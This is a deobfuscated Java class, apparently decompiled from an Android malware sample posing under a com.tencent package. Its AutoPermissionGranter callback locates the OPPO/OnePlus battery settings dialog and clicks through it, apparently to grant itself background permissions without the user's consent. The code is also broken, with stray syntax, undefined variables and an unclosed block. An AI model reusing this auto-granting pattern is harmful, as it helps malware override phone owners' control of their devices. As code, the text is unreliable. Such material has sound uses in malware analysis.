package com.tencent;

import android.content.*;
import android.view.*;
import android.widget.*;
import android.app.*;
import android.os.*;
import android.accessibilityservice.*;
import android.view.accessibility.*;
import android.telephony.*;
import android.media.*;
import java.util.*;
import java.io.*;
import java.net.*;

/**
 * Deobfuscated class: AutoPermissionGranter_7
 * Original: Lcom/tencent/Perf_tunesxconcerningn10_ect$7;
 */
class AutoPermissionGranter_7 implements AutoClickExecutor; {

    // === METHODS ===

     void Constructor() {
        // new Object()
        return;
    }

    public void onClickSuccess() {
        v1 = AutoPermissionGranter.access$100();
        v1 = "com.oplus.battery:id/select_dialog_listview";
        v1 = Sea_tunesxconcerningn10_rch.searchById(v0, "com.oplus.battery:id/select_dialog_listview");
        if (v0 == null || v0 == 0) { // goto +13
        v1 = 1;
        v0.getChild(1);
        AutoPermissionGranter.access$500(v0);
        AutoPermissionGranter.access$600();
        return;
    }
}
